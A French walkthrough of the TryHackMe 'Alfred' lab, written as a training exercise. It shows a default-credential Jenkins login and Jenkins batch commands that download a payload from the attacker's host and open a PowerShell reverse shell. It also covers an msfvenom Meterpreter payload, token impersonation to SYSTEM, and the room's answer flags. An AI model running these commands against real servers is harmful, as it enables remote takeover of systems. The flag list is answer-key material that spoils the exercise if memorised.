# TryHackMe: Alfred

**Objectif :** exploiter Jenkins avec des identifiants par defaut, obtenir un shell sous `bruce`, passer sur Meterpreter, abuser des tokens Windows via `incognito`, migrer dans un processus SYSTEM stable, puis lire les flags `user.txt` et `root.txt`.

---

## Introduction

La room **Alfred** est une bonne introduction a Jenkins comme surface d'attaque. La chaine de compromission est tres representative :

1. Jenkins expose sur `8080`
2. credentials par defaut
3. execution de commandes via un job
4. shell PowerShell initial
5. upgrade vers Meterpreter
6. privilege escalation par token impersonation

Cette room est pedagogique parce qu'elle montre bien la difference entre :

- avoir les bons **droits**,
- et tourner dans le bon **processus**.

---

## Task 1: Initial Access

### Question 1: How many ports are open? (TCP only)

Je commence par un scan TCP :

```bash
nmap -Pn -sC -sV <IP>
```

Ports ouverts :

- `80/tcp`
- `3389/tcp`
- `8080/tcp`

### Reponse

**Open TCP ports:** `3`

### Question 2: What is the username and password for the login panel?

Le port `8080` expose Jenkins. Sur la page de login, le couple par defaut fonctionne :

```text
admin:admin
```

### Reponse

**Jenkins credentials:** `admin:admin`

### Question 3: What is the user.txt flag?

La room officielle pousse vers Nishang pour obtenir un shell PowerShell.

Je recupere `Invoke-PowerShellTcp.ps1` depuis Nishang sur ma machine, puis je sers le fichier :

```bash
python3 -m http.server 8000
nc -lvnp 4444
```

Dans Jenkins, je vais dans le projet `project`, puis dans la section **Execute Windows batch command**, et je remplace le contenu par :

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://<MON_IP_THM>:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <MON_IP_THM> -Port 4444
```

Je sauvegarde, puis je clique sur **Build Now**.

Une fois le shell recu, je me rends dans le bureau de Bruce :

```powershell
type C:\Users\bruce\Desktop\user.txt
```

Valeur :

```text
79007a09481963edf2e1321abd9ae2a0
```

### Reponse

**User flag:** `79007a09481963edf2e1321abd9ae2a0`

---

## Task 2: Switching Shells

Cette partie consiste a remplacer le shell PowerShell initial par une session Meterpreter plus confortable.

### 1. Generation du payload Meterpreter

Je cree un executable :

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=<MON_IP_THM> LPORT=5555 -f exe -o rshell.exe
```

Puis je le sers :

```bash
python3 -m http.server 8000
```

### 2. Listener Metasploit

```text
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <MON_IP_THM>
set LPORT 5555
run
```

### 3. Telechargement et execution depuis Jenkins

Dans le projet Jenkins, je remplace la commande par :

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile('http://<MON_IP_THM>:8000/rshell.exe','rshell.exe')"
```

Puis j'ajoute l'execution :

```powershell
Start-Process "rshell.exe"
```

Le handler Metasploit recoit alors une session Meterpreter sous :

```text
alfred\bruce
```

Cette task ne demande pas de reponse de flag, mais elle est essentielle pour la suite.

---

## Task 3: Privilege Escalation

### Question 1: Use the `impersonate_token "BUILTIN\Administrators"` command. What is the output when you run `getuid`?

Depuis Meterpreter, je commence par verifier les privileges :

```text
shell
whoami /priv
```

Les privileges `SeDebugPrivilege` et `SeImpersonatePrivilege` sont actifs, ce qui oriente vers une escalation par token.

Je reviens dans Meterpreter :

```text
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
getuid
```

Le resultat attendu est :

```text
NT AUTHORITY\SYSTEM
```

### Reponse

**getuid output after impersonation:** `NT AUTHORITY\SYSTEM`

### Question 2: Read the root.txt file located at `C:\Windows\System32\config`

Important : apres l'impersonation, il est recommande de migrer vers un vrai processus SYSTEM stable. `services.exe` est un bon candidat ici.

Je liste les processus :

```text
ps
```

Puis je migre vers `services.exe` (ou un autre processus SYSTEM stable) :

```text
migrate <PID_services.exe>
```

Ensuite je lis le flag :

```text
cat C:\\Windows\\System32\\config\\root.txt
```

Valeur :

```text
dff0f748678f280250f25a45b8046b4a
```

### Reponse

**Root flag:** `dff0f748678f280250f25a45b8046b4a`

---

## Recapitulatif des reponses

| Question | Reponse |
|----------|---------|
| How many ports are open? | `3` |
| Login panel credentials | `admin:admin` |
| user.txt flag | `79007a09481963edf2e1321abd9ae2a0` |
| getuid after impersonate_token | `NT AUTHORITY\SYSTEM` |
| root.txt flag | `dff0f748678f280250f25a45b8046b4a` |

---

## Points cles a retenir

- Jenkins avec `admin:admin` est deja une compromission serieuse.
- Un shell initial PowerShell est utile, mais Meterpreter simplifie beaucoup la suite.
- Sur Windows, **impersoner un token** et **migrer dans le bon processus** sont deux etapes distinctes.
- `services.exe` est souvent un bon candidat pour stabiliser une session SYSTEM.

---

**Auteur :** Saad Idrissi
